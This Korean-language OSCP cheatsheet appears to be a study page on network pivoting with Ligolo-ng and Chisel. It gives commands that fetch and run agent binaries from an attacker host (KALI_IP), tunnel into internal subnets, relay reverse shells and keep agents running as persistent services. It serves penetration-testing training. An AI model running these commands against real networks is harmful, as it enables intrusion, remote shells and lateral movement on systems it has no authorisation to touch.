---
title: "Ligolo-ng"
date: 2026-06-20
weight: 120
draft: false
tags: ["oscp", "cheatsheet"]
summary: "TUN 인터페이스 기반 피벗 도구. proxychains 없이 내부 서브넷을 직접 열거한다."
---

TUN 인터페이스 기반 피벗 도구. proxychains 없이 내부 서브넷을 직접 열거할 수 있다.

- 출처: https://heretek.dev/oscp-cheatsheet/ligolo-ng/ (Jean Romero) — 재구성
- 변수: `$TARGET` = 공격 대상(내부 서브넷), `KALI_IP` = 공격자(Kali) IP

- 바이너리: `~/Tools/ligolo-ng/` (proxy=linux-arm64, agents=linux-amd64 + windows-amd64)

## 1 — 셋업 (Kali — 재부팅마다 다시 해야 함)

```bash
# Create TUN interface (resets every reboot)
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Start proxy (ALWAYS set -api-laddr to avoid port conflict with BloodHound)
~/Tools/ligolo-ng/proxy -selfcert -laddr 0.0.0.0:11601 -api-laddr 127.0.0.1:8443
```

- `-selfcert` = TLS 인증서 자동 생성. 에이전트는 `-ignore-cert`로 수용한다.
- `-api-laddr` = Ligolo 웹 UI를 8080에서 다른 포트로 옮긴다 (BloodHound가 8080을 쓴다).
- (중요) 포트 충돌 경고: 최신 Ligolo-NG는 기본 8080 웹 대시보드가 있다. `-api-laddr` 없이 실행하면 BloodHound 포트를 뺏는다.

포트 배정 (암기):

- BloodHound CE: 8080
- Burp Suite: 8081 (Burp 설정에서 기본 8080에서 변경)
- Ligolo proxy 리스너: 11601
- Ligolo 대시보드: 8443 (-api-laddr로 설정)

세션 도중 Ligolo 재시작이 필요하면:

1. 타깃의 에이전트 명령어를 기록해둔다
2. Kali에서 `Ctrl+C`로 프록시 종료
3. 위의 같은 명령으로 재시작
4. 타깃에서 에이전트 재실행 — 재접속된다
5. Ligolo 콘솔: `session` → 선택 → `start`
6. 라우트는 유지된다(이미 추가됨) — `ping`으로 확인

- (주의) OSCP 랩은 매일 리셋된다. 매일 아침 해야 할 일: TUN 생성 → 프록시 시작 → 에이전트 재업로드 → 재접속 → 라우트 재추가. 셋업 명령은 스크립트로 저장해둔다.

## 2 — 에이전트를 타깃에 업로드

### Windows

```powershell
# certutil (AV may flag — try alternatives if blocked)
certutil -urlcache -f http://KALI_IP/agent.exe C:\Windows\Temp\agent.exe

# PowerShell
iwr http://KALI_IP/agent.exe -OutFile C:\Windows\Temp\agent.exe

# SMB (no disk write — runs from share)
copy \\KALI_IP\share\agent.exe C:\Windows\Temp\agent.exe
```

### Linux

```bash
wget http://KALI_IP/agent -O /tmp/agent && chmod +x /tmp/agent
# or
curl http://KALI_IP/agent -o /tmp/agent && chmod +x /tmp/agent
```

### Kali에서 파일 서빙

```bash
# Python HTTP server (simple)
cd ~/Tools/ligolo-ng && python3 -m http.server 80

# SMB share (better for Windows — avoids AMSI/AV on download)
impacket-smbserver share ~/Tools/ligolo-ng -smb2support
```

## 3 — 에이전트 연결

```bash
# Windows
C:\Windows\Temp\agent.exe -connect KALI_IP:11601 -ignore-cert

# Linux
/tmp/agent -connect KALI_IP:11601 -ignore-cert
```

Kali의 프록시 콘솔에 에이전트가 접속 보고를 한다.

## 4 — 라우팅 (내부 서브넷 접근)

```bash
# In ligolo proxy console:
session                           # pick the agent session (by number)
ifconfig                          # check target's interfaces — find internal subnet
start                             # activate the tunnel on the ligolo TUN

# On Kali (new terminal):
sudo ip route add $TARGET/24 dev ligolo
# Replace with the actual internal subnet from ifconfig output
# ⚠️ Use /24 — a typo like /2 will break routing silently
```

이제 모든 Kali 도구(nmap, netexec, evil-winrm 등)가 `$TARGET/24`에 직접 연결된 것처럼 동작한다.

```bash
# Verify
ping -c1 $TARGET
netexec smb $TARGET/24
```

## 5 — 리스너 (내부 머신에서 리버스 셸 받기)

- 내부 머신은 Kali에 직접 닿을 수 없다. ligolo 리스너로 포트를 피벗 경유로 포워드한다.

```bash
# In ligolo proxy console (on the active session):
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80 --tcp      # for serving files
listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443 --tcp     # alt port

# List active listeners
listener_list

# Remove a listener
listener_stop <id>
```

- 동작 방식: 내부 타깃이 `PIVOT_HOST:4444`에 연결 → ligolo가 `KALI:4444`로 포워드.

```bash
# On Kali — start your listener as normal
nc -lvnp 4444

# On internal target — point shell at the PIVOT host (not Kali)
# PowerShell reverse shell example:
powershell -e <BASE64_PAYLOAD_POINTING_TO_PIVOT_IP:4444>
```

- 내부 머신은 자신이 피벗 호스트와 통신한다고 생각한다. Ligolo가 이것을 Kali로 터널링한다.

### 대체: Chisel (listener_add 실패 또는 피벗이 없을 때)

chisel을 쓰는 경우: 타깃이 직접 도달 가능(피벗 불필요), 일회성 RCE가 ligolo 에이전트를 유지하지 못함(Text4Shell 등), 타깃 이그레스가 80/443으로 필터링됨.

```bash
# === STEP 1: Kali — start chisel server ===
~/Tools/chisel server -p 8000 --reverse
# Use -p 80 or -p 443 if egress is filtered

# === STEP 2: Target — upload chisel binary ===
wget http://KALI_IP/chisel -O /tmp/chisel && chmod +x /tmp/chisel
# Windows: certutil -urlcache -f http://KALI_IP/chisel.exe C:\Windows\Temp\chisel.exe

# === STEP 3: Target — connect client (pick ONE spec) ===
./chisel client KALI_IP:8000 R:socks                       # SOCKS proxy on Kali:1080
./chisel client KALI_IP:8000 R:4444:127.0.0.1:4444         # catch reverse shell on Kali:4444
./chisel client KALI_IP:8000 R:9999:127.0.0.1:8080         # expose target's localhost:8080 → Kali:9999
```

일회성 RCE (Runtime.exec는 셸을 파싱하지 않음 — 감싸야 한다) (중요):

```bash
bash -c "nohup /tmp/chisel client KALI_IP:8000 R:4444:127.0.0.1:4444 >/dev/null 2>&1 &"
```

- 스펙 형식: `R:<kali_port>:<target_host>:<target_port>`. `R:`은 방향을 반전한다 — 클라이언트가 연결하고, 포트는 Kali에서 열린다.

## 6 — 더블 피벗 (두 홉 깊이)

시나리오: `Kali → Host A (DMZ) → Host B (internal) → Host C (deeper subnet)`

### Step 1: 첫 피벗 (Kali → Host A)

```bash
# Already done: agent on Host A connected, route to internal subnet added
sudo ip route add $TARGET/24 dev ligolo      # Host B's subnet
```

### Step 2: 터널을 경유해 Host B에 에이전트 업로드

```bash
# Serve agent on Kali
python3 -m http.server 80

# Add listener so Host B can reach Kali's HTTP server through Host A
# In ligolo console (session = Host A):
listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80 --tcp

# On Host B (via evil-winrm or shell through first tunnel):
wget http://HOST_A_INTERNAL_IP/agent -O /tmp/agent && chmod +x /tmp/agent
```

### Step 3: Host B의 에이전트가 Kali 프록시에 도달하게 하기

```bash
# Add listener on Host A to forward ligolo port back to Kali
# In ligolo console (session = Host A):
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp

# On Host B — connect agent through Host A
/tmp/agent -connect HOST_A_INTERNAL_IP:11601 -ignore-cert
```

### Step 4: 더 깊은 서브넷 라우팅

```bash
# New session appears in proxy console — select it
session                           # pick Host B's session

# Create second TUN interface
sudo ip tuntap add user $(whoami) mode tun ligolo2
sudo ip link set ligolo2 up

# Start tunnel on the new interface
start --tun ligolo2

# Add route to deeper subnet
sudo ip route add $TARGET/24 dev ligolo2
```

이제 Kali 도구가 두 홉을 거쳐 `$TARGET/24`에 도달한다.

- 가장 깊은 서브넷에서 리버스 셸을 받으려면 Host B와 Host A 양쪽에 리스너를 체이닝한다.

## 문제 해결 (Troubleshooting)

- Agent는 연결되지만 yamux가 계속 죽음 → TARGET 박스를 리셋한다. 이전 세션의 좀비 에이전트 프로세스가 taskkill 후에도 간섭할 수 있다. 그래도 안 되면 Kali의 프록시를 재시작
- Agent가 아예 연결 안 됨 → 피벗 방화벽 확인, 11601 포트 개방 확인, `-retry` 플래그 시도
- "Device for nexthop is not up" → TUN 인터페이스가 아직 없다. `sudo ip tuntap add` + `ip link set up` 을 먼저 실행
- Route add "Invalid prefix" → CIDR 확인 — `/24` 이어야 한다. `/2`, `/254` 오타 주의
- 라우트를 추가했지만 연결이 안 됨 → 프록시 콘솔에서 `start` 실행 확인; Kali에서 `ip route` 확인
- 터널을 통과하는 도구 타임아웃 → 일부 도구는 긴 타임아웃 필요; nmap은 `-T3 --max-retries 2`
- 하나의 피벗에 여러 서브넷 → 같은 ligolo 인터페이스에 라우트를 여러 개 추가
- 터널을 통한 DNS resolution → `/etc/resolv.conf`에 내부 DNS를 추가하거나 IP를 직접 사용
- 재부팅 시 에이전트 죽음 → 서비스 또는 예약 작업으로 에이전트를 실행해 지속성 확보

## OSCP 시험 체크리스트

```text
[ ] TUN interface created: sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up
[ ] Proxy running: ~/Tools/ligolo-ng/proxy -selfcert -laddr 0.0.0.0:11601 -api-laddr 127.0.0.1:8443
[ ] Agent uploaded and connected from first pivot
[ ] Internal subnet route added (double-check /24 not typo)
[ ] Listener set up for reverse shells (port 4444 + port 80)
[ ] Verified connectivity: ping or netexec sweep of internal subnet
[ ] If double pivot needed: second TUN (ligolo2), second agent, chained listeners
[ ] Burp moved to 8081 (not conflicting with BloodHound 8080)
```
